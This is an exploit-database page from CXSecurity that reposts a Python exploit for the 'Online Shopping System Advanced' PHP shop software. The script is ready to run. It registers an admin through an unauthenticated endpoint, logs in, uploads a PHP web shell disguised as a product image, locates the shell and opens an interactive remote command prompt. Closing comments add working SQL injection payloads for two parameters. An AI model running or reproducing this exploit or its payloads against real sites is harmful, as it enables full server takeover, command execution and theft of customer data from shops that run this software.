---
title: Online Shopping System Advanced - Remote Code Execution
url: https://cxsecurity.com/issue/WLB-2025040034
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-04-25
fetch_date: 2025-10-06T22:03:33.625293
---

# Online Shopping System Advanced - Remote Code Execution

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Online Shopping System Advanced - Remote Code Execution** **2025.04.24**  Credit:  **[bRpsd](https://cxsecurity.com/author/bRpsd/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

# Exploit Title: Online Shopping System Advanced - Remote Code Execution
# Date: 2025-03-11
# Exploit Author: bRpsd
# Contact: cy@live.no
# Zone-H: www.zone-h.org/archive/notifier=bRpsd
# Vendor: https://github.com/PuneethReddyHC/online-shopping-system-advanced/
# Version: 1.0 [latest]
# Tested on: MacOS XAMPP Darwin Kernel
# CVE : N/A
import requests
import argparse
from bs4 import BeautifulSoup
import os
parser = argparse.ArgumentParser(description='Unauthenticated Privilege Escalation + Arbitrary File Upload = RCE ')
parser.add\_argument('--url', required=True, help='Base URL of the application')
args = parser.parse\_args()
# Define the base URL of the application
base\_url = args.url
# Step 1: Registering an Admin User
register\_url = f"{base\_url}/admin/reg.php"
register\_data = {
"admin\_name": "exploit\_admin",
"admin\_email": "exploit\_admin@example.com",
"password\_1": "password123",
"password\_2": "password123",
"reg\_user": "Register"
}
# Create a session to maintain cookies
session = requests.Session()
# Send the registration request
register\_response = session.post(register\_url, data=register\_data)
print("Admin created")
# Step 2: Login as Admin
login\_url = f"{base\_url}/admin/login.php"
login\_data = {
"admin\_username": "exploit\_admin@example.com",
"password": "password123",
"login\_admin": "Log in"
}
# Send the login request
login\_response = session.post(login\_url, data=login\_data)
print("Logged in as admin")
# Step 3: Upload a PHP Shell
edit\_product\_url = f"{base\_url}/admin/admin/edit\_product.php?product\_id=1"
php\_shell = "<?php if(isset($\_GET['cmd'])) { echo '<pre>' . shell\_exec($\_GET['cmd']) . '</pre>'; } ?>"
files = {
"picture": ("shell.php", php\_shell, "image/jpeg")
}
upload\_data = {
"product\_name": "Exploit Product",
"details": "This is a test product",
"price": "100",
"product\_type": "1",
"brand": "1",
"tags": "exploit",
"btn\_save": "Save"
}
# Send the file upload request
upload\_response = session.post(edit\_product\_url, data=upload\_data, files=files)
print("Shell uploaded")
# Step 4: List files in the product\_images directory
product\_images\_url = f"{base\_url}/product\_images/"
response = session.get(product\_images\_url)
soup = BeautifulSoup(response.text, 'html.parser')
# Find all links to files in the directory
links = soup.find\_all('a')
shell\_path = None
for link in links:
href = link.get('href')
if 'shell.php' in href:
shell\_path = href
break
if shell\_path:
shell\_url = f"{product\_images\_url}{shell\_path}"
print(f"Shell URL: {shell\_url}")
# Step 5: Interact with the Shell
def execute\_command(command):
response = session.get(shell\_url, params={"cmd": command})
return response.text
# Example of executing commands
while True:
cmd = input("command: ")
if cmd.lower() in ['exit', 'quit']:
break
output = execute\_command(cmd)
print(output)
else:
print("Shell location not found.")
# There's also an SQLi in multiple parts of the script such as
# /product.php?p=71
# /products.php?cat\_id=6
# Parameter: p (GET)
# Type: boolean-based blind
# Title: AND boolean-based blind - WHERE or HAVING clause (MySQL comment)
# Payload: p=73%' AND 2717=2717#
# Type: error-based
# Title: MySQL OR error-based - WHERE or HAVING clause (FLOOR)
# Payload: p=-8485%' OR 1 GROUP BY CONCAT(0x717a6a6b71,(SELECT (CASE WHEN (7151=7151) THEN 1 ELSE 0 END)),0x716a6b7871,FLOOR(RAND(0)\*2)) HAVING MIN(0)#
#
# Type: time-based blind
# Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
# Payload: p=73%' AND (SELECT 2579 FROM (SELECT(SLEEP(5)))bYFm) AND 'Wgsl%'='Wgsl
#
#Type: UNION query
#Title: MySQL UNION query (NULL) - 10 columns
#Payload: p=73%' UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x717a6a6b71,0x574f756e6670686a636b76776b5973734d7a434e634a6e66746c704946477a7068656e7a64544e54,0x716a6b7871),NULL,NULL,NULL,NULL,NULL#

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2025040034)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 -1

0%

100%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top